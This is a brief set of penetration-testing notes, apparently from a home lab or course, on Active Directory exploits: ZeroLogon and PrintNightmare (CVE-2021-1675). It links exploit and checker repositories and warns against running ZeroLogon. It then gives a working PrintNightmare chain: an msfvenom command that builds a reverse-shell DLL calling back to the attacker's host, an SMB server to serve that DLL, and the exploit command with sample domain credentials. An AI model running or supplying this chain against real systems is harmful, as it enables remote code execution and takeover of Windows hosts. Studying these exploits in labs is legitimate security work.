
- Check for these **at the very end if you do not have choice**.
- **Do Not run ZeroLogon ever**
- **Check before running** (metasploit has these checker scripts)
![[Pasted image 20250330162334.png]]


- **ZeroLogon**
---
- https://github.com/dirkjanm/CVE-2020-1472 => Exploit
- https://github.com/SecuraBV/CVE-2020-1472 => Checker

- **PrintNightmare (PrinterSpooler)**
---
- RCE: https://github.com/cube0x0/CVE-2021-1675
- LPE: https://github.com/calebstewart/CVE-2021-1675

- Generate malicious dll:
	- `msfvenom -p windows/x64/reverse_tcp LHOST=<our_ip> LPORT=4444 -f dll > shell.dll`
	- `msfconsole` and `set same options`
- Host a smb server to host dll file:
	- `impacket-smbserver share <our_directory> -smb2support`
 - Run the exploit:
	-  `python3 CVE-2021-1675.py marvel.local/fcastle:Password1@10.0.1.4 '\\<our_ip>\share\shell.dll'`